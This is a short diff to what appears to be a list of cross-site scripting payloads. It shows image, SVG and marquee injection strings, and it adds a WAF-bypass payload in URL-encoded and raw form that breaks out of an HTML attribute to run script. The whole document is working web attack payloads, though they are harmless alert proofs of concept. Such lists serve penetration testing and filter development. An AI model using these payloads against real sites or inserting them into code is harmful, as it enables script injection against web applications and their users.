@@ -4,3 +4,6 @@
 <img src=x onerror=alert("XSS")>
 <svg/onload=prompt(1)>
 <marquee><h1>XSS</h1></marquee>
+%22%3E%3Csvg/onload=alert(%27XSS_WAF_BYPASS_:-)%27)%3E
+"><svg/onload=alert('XSS_WAF_BYPASS_:-)')>
+
